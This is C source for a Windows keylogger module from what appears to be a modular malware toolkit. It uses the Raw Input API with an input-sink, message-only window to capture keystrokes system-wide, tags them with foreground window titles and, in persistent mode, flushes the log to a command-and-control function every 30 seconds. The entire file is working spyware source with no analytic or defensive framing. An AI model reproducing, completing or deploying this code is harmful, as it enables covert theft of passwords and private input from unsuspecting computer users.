// chunk: collectors/keylogger_rawinput
// depends: core/emit_buffer
// provides: collect_keystrokes_rawinput, poll_keys, flush_keylog, run_self_test, persistent_keylog, batch_keylog
// headers: windows.h
// note: Raw Input API capture — RIDEV_INPUTSINK on message-only window, no hooks

#ifndef CHUNK_KEYLOGGER_RAWINPUT
#define CHUNK_KEYLOGGER_RAWINPUT

#ifndef FLUSH_INTERVAL_MS
#define FLUSH_INTERVAL_MS 30000
#endif

#ifndef BATCH_DURATION_MS
#define BATCH_DURATION_MS 30000
#endif

static char g_keylog_buf[32768];
static int  g_keylog_pos = 0;
static char g_last_window[256] = {0};

static void flush_to_c2(void);

static void log_key(int vk) {
    if (g_keylog_pos >= (int)sizeof(g_keylog_buf) - 16) return;
    switch (vk) {
        case VK_RETURN: memcpy(g_keylog_buf + g_keylog_pos, "[ENTER]", 7); g_keylog_pos += 7; return;
        case VK_TAB:    memcpy(g_keylog_buf + g_keylog_pos, "[TAB]", 5); g_keylog_pos += 5; return;
        case VK_BACK:   memcpy(g_keylog_buf + g_keylog_pos, "[BS]", 4); g_keylog_pos += 4; return;
        case VK_DELETE: memcpy(g_keylog_buf + g_keylog_pos, "[DEL]", 5); g_keylog_pos += 5; return;
        case VK_ESCAPE: memcpy(g_keylog_buf + g_keylog_pos, "[ESC]", 5); g_keylog_pos += 5; return;
        case VK_SPACE:  g_keylog_buf[g_keylog_pos++] = ' '; return;
    }
    if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
        vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_LCONTROL ||
        vk == VK_RCONTROL || vk == VK_LMENU || vk == VK_RMENU ||
        vk == VK_LWIN || vk == VK_RWIN || vk == VK_CAPITAL ||
        vk == VK_NUMLOCK || vk == VK_SCROLL) return;
    BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
    if (vk >= 0x41 && vk <= 0x5A) {
        g_keylog_buf[g_keylog_pos++] = shift ? (char)vk : (char)(vk + 32);
        return;
    }
    if (vk >= 0x30 && vk <= 0x39) {
        if (shift) {
            static const char sh[] = ")!@#$%^&*(";
            g_keylog_buf[g_keylog_pos++] = sh[vk - 0x30];
        } else {
            g_keylog_buf[g_keylog_pos++] = (char)vk;
        }
        return;
    }
}

static void poll_keys(void) {
    char wnd_title[256] = {0};
    HWND fg = GetForegroundWindow();
    if (fg) GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
    if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
        int n = snprintf(g_keylog_buf + g_keylog_pos,
                         sizeof(g_keylog_buf) - g_keylog_pos,
                         "\r\n[%s]\r\n", wnd_title);
        if (n > 0) g_keylog_pos += n;
        strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
    }
}

static LRESULT CALLBACK ri_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_INPUT) {
        UINT sz = 0;
        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &sz, sizeof(RAWINPUTHEADER));
        if (sz <= 256) {
            BYTE buf[256];
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buf, &sz, sizeof(RAWINPUTHEADER)) != (UINT)-1) {
                RAWINPUT *ri = (RAWINPUT *)buf;
                if (ri->header.dwType == RIM_TYPEKEYBOARD) {
                    if (ri->data.keyboard.Message == WM_KEYDOWN || ri->data.keyboard.Message == WM_SYSKEYDOWN) {
                        poll_keys();
                        log_key(ri->data.keyboard.VKey);
                    }
                }
            }
        }
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

static void flush_keylog(void) {
    if (g_keylog_pos == 0) return;
    emitf("=== KEYLOG ===\r\n");
    emit(g_keylog_buf, (DWORD)g_keylog_pos);
    emitf("\r\n\r\n");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();
}

static int run_self_test(void) {
    int before = g_keylog_pos;
    log_key(0x58);
    log_key(0x39);
    return (g_keylog_pos > before) ? 1 : 0;
}

static HWND ri_create_window(void) {
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = ri_wndproc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RawInputSink";
    RegisterClassA(&wc);
    HWND hwnd = CreateWindowExA(0, "RawInputSink", NULL, 0, 0, 0, 0, 0,
                                 HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
    if (hwnd) {
        RAWINPUTDEVICE rid = {0};
        rid.usUsagePage = 0x01;
        rid.usUsage = 0x06;
        rid.dwFlags = RIDEV_INPUTSINK;
        rid.hwndTarget = hwnd;
        RegisterRawInputDevices(&rid, 1, sizeof(rid));
    }
    return hwnd;
}

static void persistent_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    HWND hwnd = ri_create_window();
    if (!hwnd) {
        emitf("=== KEYLOG STATUS ===\r\nHook: FAILED (rawinput)\r\n\r\n");
        return;
    }

    int self_test_ok = run_self_test();
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (mode=rawinput_persistent, self_test=%s)\r\n\r\n",
           self_test_ok ? "PASS" : "FAIL");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();

    DWORD last_flush = GetTickCount();
    MSG msg;
    for (;;) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        DWORD now = GetTickCount();
        if ((now - last_flush >= FLUSH_INTERVAL_MS && g_keylog_pos > 0) ||
            g_keylog_pos >= (int)sizeof(g_keylog_buf) - 256) {
            flush_keylog();
            last_flush = now;
        }
        Sleep(10);
    }
}

static void batch_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    HWND hwnd = ri_create_window();
    if (!hwnd) {
        emitf("=== KEYLOG STATUS ===\r\nHook: FAILED (rawinput)\r\n\r\n");
        return;
    }

    DWORD start = GetTickCount();
    MSG msg;
    while (GetTickCount() - start < (DWORD)(BATCH_DURATION_MS - 3000)) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }

    int self_test_ok = run_self_test();
    while (GetTickCount() - start < BATCH_DURATION_MS) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }

    DestroyWindow(hwnd);
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d, method=rawinput)\r\n\r\n",
           BATCH_DURATION_MS, self_test_ok ? "PASS" : "FAIL", g_keylog_pos);
    if (g_keylog_pos > 0) {
        emitf("=== KEYLOG CAPTURE (%d ms) ===\r\n", BATCH_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}

#endif
